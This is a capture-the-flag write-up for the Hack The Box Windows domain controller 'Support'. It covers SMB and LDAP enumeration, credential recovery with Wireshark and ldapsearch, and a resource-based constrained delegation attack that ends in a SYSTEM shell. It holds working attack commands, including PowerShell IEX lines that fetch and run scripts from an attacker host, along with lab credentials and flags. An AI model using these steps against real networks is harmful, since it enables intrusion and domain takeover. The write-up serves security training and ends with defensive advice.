---
title: "Support"
os: Windows
difficulty: Easy
tags: [active-directory, smb, ldap, wireshark, credential-leak, bloodhound, rbcd, kerberos, evil-winrm]
---

**Target:** 10.129.63.197 (support.htb)

## Reconnaissance

A full TCP port scan reveals a Windows Domain Controller for the `support.htb` domain.

```shell
nmap -sC -sV -Pn -p- -T4 10.129.63.197
```

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap          Microsoft Windows AD LDAP (Domain: support.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http
3268/tcp  open  ldap          Global Catalog
3269/tcp  open  tcpwrapped
5985/tcp  open  http          WinRM (Microsoft-HTTPAPI/2.0)
9389/tcp  open  mc-nmf        .NET Message Framing
```

The open port set (88, 389, 445, 464, 3268, 5985) is a classic AD DC signature — Kerberos, LDAP/GC, SMB, kpasswd, and WinRM are all present, and `smb2-security-mode` confirms signing is required.

Add the domain to `/etc/hosts`:

```bash
echo "10.129.63.197 support.htb dc.support.htb" | sudo tee -a /etc/hosts
```

## SMB Enumeration

CrackMapExec confirms the host and domain, and a null session is rejected:

```shell
crackmapexec smb 10.129.63.197
crackmapexec smb 10.129.63.197 --shares -u '' -p ''
```

```
[+] support.htb\: 
[-] Error enumerating shares: STATUS_ACCESS_DENIED
```

However, supplying an **invalid but non-empty username** with a blank password is enough to authenticate anonymously and enumerate shares — a common misconfiguration on domains that allow "Everyone" read on certain shares:

```shell
crackmapexec smb 10.129.63.197 --shares -u 'Testitout' -p ''
```

```
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
NETLOGON                        Logon server share
support-tools   READ            support staff tools
SYSVOL                          Logon server share
```

`support-tools` stands out immediately — it's not a default AD share.

### Pulling the share contents

```shell
smbclient -N //10.129.63.197/support-tools
```

```
smb: \> dir
  7-ZipPortable_21.07.paf.exe
  npp.8.4.1.portable.x64.zip
  putty.exe
  SysinternalsSuite.zip
  UserInfo.exe.zip
  windirstat1_1_2_setup.exe
  WiresharkPortable64_3.6.5.paf.exe
```

`UserInfo.exe.zip` is the odd one out — everything else is a well-known public utility. Download and extract it:

```shell
smb: \> get UserInfo.exe.zip
```

```shell
mkdir UserInfo && cd UserInfo
unzip ../UserInfo.exe.zip
```

```
inflating: UserInfo.exe
inflating: CommandLineParser.dll
inflating: Microsoft.Bcl.AsyncInterfaces.dll
inflating: ...
inflating: UserInfo.exe.config
```

```shell
file UserInfo.exe
```

```
UserInfo.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```

It's a .NET/Mono assembly, so it needs Mono installed to run on Linux:

```bash
sudo apt update && sudo apt install -y mono-complete
```

## Reversing UserInfo.exe — Capturing LDAP Credentials

Running the binary shows it's a small internal tool for querying AD user info:

```shell
./UserInfo.exe
```

```
Usage: UserInfo.exe [options] [commands]

Commands:
  find    Find a user
  user    Get information about a user
```

```shell
./UserInfo.exe -v find -first ruderaph
```

```
[*] LDAP query to use: (givenName=ruderaph)
[-] Exception: Connect Error
```

The tool clearly performs an LDAP bind under the hood using **hardcoded service-account credentials**. Since it fails to resolve/connect from outside, capturing the traffic in Wireshark reveals both the DNS lookup for `support.htb` and, once `/etc/hosts` is corrected, an LDAP bind attempt.

**Wireshark workflow:**

Capture on `any` first to confirm the DNS query for `support.htb`.

![Wireshark capture showing DNS query for support.htb](/assets/images/Pasted%20image%2020231221192239.png)

Add the resolved name to `/etc/hosts` and re-run the tool.

![Updating /etc/hosts with the resolved domain](/assets/images/Pasted%20image%2020231221192353.png)

We can see it querying `support.htb`:

![Wireshark showing the tool querying support.htb](/assets/images/Pasted%20image%2020231221192734.png)

Running the command again after fixing `/etc/hosts` gives a different result:

![UserInfo.exe behaving differently after the hosts fix](/assets/images/Pasted%20image%2020231221192929.png)

Switch the capture filter to your VPN interface (`tun0`), drop the DNS filter, and filter on `ldap`. `\ldap` corresponds to a user account called `ldap`:

![Wireshark filtered on ldap traffic](/assets/images/Pasted%20image%2020231221193159.png)

Right-click the `bindRequest` frame → **Follow → TCP Stream**, then follow the stream down to recover the plaintext bind credentials:

![Following the TCP stream to recover plaintext LDAP bind credentials](/assets/images/Pasted%20image%2020231221193622.png)

The bind is performed as the `ldap` service account:

```
ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

Confirm the credentials are valid:

```shell
crackmapexec smb 10.129.63.197 --shares -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```

```
[+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
NETLOGON        READ    Logon server share
support-tools   READ    support staff tools
SYSVOL          READ    Logon server share
```

Authentication succeeds and share access (notably `SYSVOL`/`NETLOGON` read) confirms this is a legitimate domain account.

## Domain Enumeration with BloodHound

With a valid, low-privilege domain account, pull the full AD graph:

```shell
python3 bloodhound.py --dns-tcp -ns 10.129.63.197 -d support.htb \
  -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -c all
```

```
INFO: Found AD domain: support.htb
INFO: Found 1 computers
INFO: Found 21 users
INFO: Found 53 groups
INFO: Found 2 gpos / 1 ous / 19 containers
INFO: Done
```

Loading the `.json` files into BloodHound highlights `Support@support.htb` and `Shared Support Accounts@support.htb` as high-value targets worth pivoting into.

![BloodHound graph highlighting Support and Shared Support Accounts](/assets/images/Pasted%20image%2020231222062742.png)

### Dumping the raw LDAP tree for cleartext secrets

It's worth also dumping the full LDAP directory directly (rather than relying only on BloodHound's parsed graph) to catch anything stashed in free-text attributes like `info`/`description`:

```bash
ldapsearch -x -H ldap://support.htb \
  -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b "DC=support,DC=htb" > ldap_dump.txt
```

Grepping through the dump turns up a cleartext password stashed in the `info` field of the `support` user object — a classic (if bad) practice of using that attribute as an informal notes field:

```
dn: CN=support,CN=Users,DC=support,DC=htb
...
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
```

```
support : Ironside47pleasure40Watchful
```

Validate:

```shell
crackmapexec smb 10.129.63.197 -u 'support' -p 'Ironside47pleasure40Watchful'
```

```
[+] support.htb\support:Ironside47pleasure40Watchful
```

This account is a member of **Remote Management Users** — meaning it can WinRM directly into the DC.

Mark `support` as "Owned" in BloodHound:

![Marking support as Owned in BloodHound](/assets/images/Pasted%20image%2020231222063514.png)

## Foothold — Resource-Based Constrained Delegation (RBCD)

Running **Shortest Path to Owned Principals** shows the `support` user can PSRemote directly to `dc.support.htb`:

![BloodHound shortest path showing PSRemote to the DC](/assets/images/Pasted%20image%2020231222063722.png)

Digging into **Outbound Object Control → Group Delegated Object Control** reveals `GenericAll`/`GenericWrite`-style delegated control over the DC's computer object via a group relationship — enough to carry out an RBCD attack:

![BloodHound outbound object control on the DC computer object](/assets/images/Pasted%20image%2020231222064021.png)
![Group delegated object control detail](/assets/images/Pasted%20image%2020231222064410.png)

### Connect and stage tools

```shell
evil-winrm -i 10.129.63.197 -u support -p Ironside47pleasure40Watchful
```

```
*Evil-WinRM* PS C:\Users\support\Documents> cd \programdata
```

`C:\ProgramData` is world-writable, so it's a convenient staging directory.

Host tooling locally and pull it down:

```bash
python3 -m http.server 8000
```

```powershell
# Rubeus — precompiled binary, since building from source needs the full .NET SDK
curl 10.10.16.17:8000/Rubeus.exe -o Rubeus.exe

IEX(New-Object Net.WebClient).downloadString('http://10.10.16.17:8000/Powermad.ps1')
IEX(New-Object Net.WebClient).downloadString('http://10.10.16.17:8000/PowerView.ps1')
```

### Check the machine account quota

```powershell
Get-DomainObject -Identity 'DC=SUPPORT,DC=HTB' | select ms-ds-machineaccountquota
```

```
ms-ds-machineaccountquota
-------------------------
                       10
```

A non-zero quota means any domain user can create up to 10 computer objects — the prerequisite for RBCD.

### Create a fake computer account

```powershell
New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
```

```
[+] Machine account FAKE-COMP01 added
```

### Build a security descriptor granting the fake computer delegation rights on the DC

```powershell
$ComputerSid = Get-DomainComputer FAKE-COMP01 -Properties objectsid | Select -Expand objectsid

$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList `
  "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"

$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

### Write it to the DC's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute

```powershell
Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

This tells the DC that `FAKE-COMP01$` is permitted to delegate on its behalf — the core of the RBCD abuse.

### Get an RC4 hash for the fake computer's password

```powershell
.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
```

```
rc4_hmac  :  58A478135A93AC3BF058A5EA0E8FDB71
```

### S4U2Self / S4U2Proxy — impersonate Administrator

```powershell
.\Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 `
  /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
```

```
[+] TGT request successful!
[+] S4U2self success!
[+] S4U2proxy success!
[+] Ticket successfully imported!
```

`/ptt` injects the resulting service ticket for `cifs/dc.support.htb` directly into the current session — but since this session is on Kali, we instead export it for use with Impacket.

### Convert the ticket for use on Linux

Save the base64 ticket blob:

```bash
vim ticket.kirbi.b64
:%s/ //g        # strip whitespace introduced by copy/paste
```

```bash
base64 -d ticket.kirbi.b64 > ticket.kirbi
/opt/impacket/examples/ticketConverter.py ticket.kirbi ticket.ccache
```

```
[*] converting kirbi to ccache...
[+] done
```

### Get a SYSTEM shell as Administrator

```bash
KRB5CCNAME=ticket.ccache /opt/impacket/examples/psexec.py \
  support.htb/administrator@dc.support.htb -k -no-pass
```

```
[*] Found writable share ADMIN$
[*] Uploading file huPvLlPY.exe
[*] Starting service BVan.....
Microsoft Windows [Version 10.0.20348.859]
C:\Windows\system32>
```

## Flags

**User:**

```
C:\Users\support\Desktop> type user.txt
14eb1d7c7103e123c8719b4e88aaf09b
```

**Root:**

```
C:\Users\Administrator\Desktop> type root.txt
bd488e1215b7dda07ec2d71bb92a8644
```

## Summary

| Stage | Technique |
|---|---|
| Initial access | Anonymous SMB read on a non-default share (`support-tools`) |
| Credential exposure | Hardcoded LDAP bind creds recovered from a custom .NET tool via Wireshark |
| Lateral info gathering | BloodHound + raw `ldapsearch` dump revealed a second cleartext password in a user's `info` attribute |
| Privilege escalation | Resource-Based Constrained Delegation (RBCD) abuse via a self-created machine account |
| Result | SYSTEM shell as `Administrator` on the Domain Controller |

**Key takeaways for defenders:**

- Don't ship internal tools with hardcoded service-account credentials — especially ones that transmit LDAP binds in cleartext.
- Never store secrets in AD attributes like `info`/`description` — they're readable by any authenticated (and sometimes anonymous) user.
- Restrict `ms-DS-MachineAccountQuota` to `0` unless it's operationally required — it's a prerequisite for several RBCD-style attacks.
- Review delegated permissions on computer objects (`GenericAll`/`GenericWrite`) granted to non-admin users or groups.
